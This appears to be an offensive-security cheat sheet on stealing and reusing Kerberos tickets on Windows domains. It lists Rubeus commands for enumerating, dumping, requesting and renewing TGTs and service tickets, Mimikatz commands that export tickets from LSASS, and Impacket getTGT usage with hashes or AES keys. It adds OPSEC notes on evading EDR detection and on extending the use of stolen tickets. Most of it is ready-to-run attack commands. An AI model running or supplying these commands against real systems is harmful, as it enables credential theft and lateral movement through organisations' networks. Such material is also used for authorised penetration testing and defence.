## Information

> Minimum requirement: `high-integrity`

If an adversary gains elevated access on a computer, they can extract Kerberos tickets stored in cache. If multiple logon sessions exist on the same system, the adversary may be able to extract and reuse TGTs or service tickets belonging to those users.

| Need | Method | OPSEC |
| --- | --- | --- |
| I want to see whether TGTs already exist | `triage` | ⭐⭐⭐⭐⭐ |
| I want to extract a visible TGT | `dump` | ⭐⭐⭐⭐ |
| No TGT exists, but I am the user and want one | `tgtdeleg` | ⭐⭐⭐ |
| I have an AES key or password and want a TGT without an existing session | `asktgt` | ⭐⭐⭐ |
| I have a TGT and want a TGS | `asktgs` | ⭐⭐⭐ |

- [ ] OPSEC

The main OPSEC advantage of extracting Kerberos tickets with tools such as Rubeus is that it does not require a raw dump of LSASS memory, unlike classic Mimikatz techniques such as `sekurlsa::logonpasswords`. Instead, tickets are retrieved through legitimate LSA APIs, such as `LsaCallAuthenticationPackage`, which significantly reduces noise and avoids direct access to the LSASS process. However, while this approach is less intrusive, it is not invisible: it still interacts with monitored authentication subsystems, and modern EDRs can detect anomalous LSA usage patterns or behaviors associated with ticket extraction. In short, this technique is more OPSEC-friendly than hash dumping, but it should not be considered fully stealthy and is best reserved for situations where that risk is acceptable.

## Enumeration of Existing Tickets

> What is already in memory.

```powershell
# Enumerate tickets currently in memory
.\Rubeus.exe triage

------------------------------------------------------------------------------------------- 
| LUID     | UserName              | Service                       | EndTime             |
------------------------------------------------------------------------------------------ 
| 0x23e4de | ada @ CONTOSO.COM     | krbtgt/DOM.COM                | 02/12/2025 08:24:37 |
| 0x23e4de | rsteel @ CONTOSO.COM  | cifs/host.dom.com/dom.com     | 02/12/2025 08:24:37 |
------------------------------------------------------------------------------------------ 
```

- `triage` enumerates each logon session present and its associated tickets in memory. It is quieter than `tgtdeleg`.
  - It only reads the current process/LSASS context.
  - It does **not** generate network traffic.
  - It does **not** create new tickets.
  - It does **not** trigger new Kerberos logs.
  - It does **not** aggressively abuse GSS-API.

```text
0x3e7 -> SYSTEM (machine)
0x3e4 -> LOCAL SERVICE
0x3e5 -> NETWORK SERVICE
```

## Ticket Extraction

- [ ] Rubeus

> Ask Windows for tickets it already has loaded.

- If you dump your own tickets (your own LUID), you do **not** need high integrity.
- If you dump SYSTEM (`0x3e7`) or another user's tickets, you **do** need admin/high integrity and you need protections such as PPL/CredGuard to be absent or bypassed.

```powershell
# Dump specific tickets (TGT or ST)
.\Rubeus.exe dump /luid:LUID /service:krbtgt /nowrap
.\Rubeus.exe dump /luid:LUID /service:cifs/host.dom.com /nowrap

# Extract the TGT of the current host
.\Rubeus.exe dump /luid:0x3e7 /service:krbtgt /nowrap
```

- `dump`: Extracts the ticket we are targeting
- `/service:krbtgt` → TGT (critical)
    - request TGS
    - reliable PTT
    - enables domain-wide movement
- `/service:cifs`, `ldap`, etc → TGS (situational)
    - access limited to that specific service
    - does not generate additional tickets
    - PTT may work (user context)
    - machine accounts → rarely reusable
- `/luid`: Extracts tickets from a specific logon session (identified by the Logon Unique Identifier / LUID)

- [ ] Mimikatz

> Lower-level access: read LSASS memory directly and extract everything relevant.

```powershell
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::tickets /export" "exit"
.\mimikatz.exe "kerberos::list /export" "exit"
.\mimikatz.exe "base64 /out:true" "kerberos::list /export" "exit"
```

- `"privilege::debug"`: Enables `SeDebugPrivilege` in Mimikatz, allowing it to read protected processes like LSASS (required for `sekurlsa::*`).
- `token::elevate`: Impersonates the `SYSTEM` token.
- `sekurlsa::tickets /export` → ALL tickets from LSASS (all sessions/users), requires admin.
- `kerberos::list /export` → ONLY tickets from the current user, does not require admin (if running as that user).
- `base64 /out:true ...` → Same as above, but outputs in base64.

## TGT request

> _Requests a TGT from scratch using the user’s AES keys or NT hash_

- [ ] WINDOWS

```powershell
.\Rubeus.exe asktgt /user:user /domain:DOMAIN.COM /aes256:AES_KEY /nowrap
.\Rubeus.exe asktgt /user:user /domain:DOMAIN.COM /password:password /nowrap
```

- [ ] LINUX

```powershell
# Classic authentication (password)
kinit user@DOMAIN.LOCAL

# Using a keytab
kinit user@DOMAIN.LOCAL -k -t /path/to/user.keytab

# Use NT hash or AES key to obtain a TGT
getTGT.py 'DOMAIN.LOCAL/user:password' -dc-ip DC_IP
getTGT.py DOMAIN.LOCAL/user -hashes :<NTLM>
getTGT.py DOMAIN.LOCAL/user -aesKey <AES256>

# Manually set the cache file to use
export KRB5CCNAME=user.ccache

# View the cached TGT
klist
```

- `-k`: use keytab for authentication
- `-t`: path to the keytab file

- [ ] Force TGT retrieval for the current user context 

```powershell
.\Rubeus.exe tgtdeleg /nowrap
```

`tgtdeleg`: Does not touch LSASS. It creates a fake connection to the DC and leverages GSS-API to obtain a delegable TGT

## TGS request

- [ ] WINDOWS

```powershell
# MSSQL
.\Rubeus.exe asktgs /service:MSSQLSvc/host.domain.local:1433 /ticket:ticket_base64 /nowap

# CIFS
.\Rubeus.exe asktgs /service:cifs/host.domain.local /ticket:TGT_base64 /nowrap

# LDAP
.\Rubeus.exe asktgs /service:ldap/host.domain.local /ticket:TGT_base64 /nowrap
```

- [ ] LINUX

```powershell
kvno cifs/host.domain.local      
kvno ldap/host.domain.local
```

- `kvno <SPN>`: requests a TGS for that service from the KDC and stores it in the current Kerberos cache (`KRB5CCNAME`).
- If you only have a TGT, Kerberos-aware clients such as `smbclient -k` can request the TGS automatically when needed, similar to Windows.

## Helpers

TGTs (authentication tickets) have a limited lifetime, typically **10 hours by default**, and a maximum renewal window, typically **7 days by default**. As long as the `RenewTill` field has not expired, you can manually renew the TGT with Rubeus without needing the original password:

```powershell
# Describe a ticket
.\Rubeus.exe describe /ticket:

# StartTime                :  11/04/2025 16:33:17
# EndTime                  :  12/04/2025 02:33:17
# RenewTill                :  18/04/2025 16:33:17

# Renew a ticket
.\Rubeus.exe renew /ticket: /nowrap
```

- `StartTime`: date and time when the KDC issued the ticket.
- `EndTime`: expiration time of the ticket. By default, this is typically 10 hours after `StartTime`.
- `RenewTill`: last point at which the ticket can still be renewed. By default, this is typically 7 days after `StartTime`.

> You can keep using a stolen TGT for days by renewing it, but not forever. Once `RenewTill` expires, you will need to compromise credentials again to continue moving.

```powershell
# Remove all whitespace and line breaks from a file (PowerShell)
(Get-Content .\archivo.txt -Raw) -replace '\s+',''

# Remove all whitespace and line breaks from a file (Linux)
tr -d '\n[:space:]' < archivo.txt
```
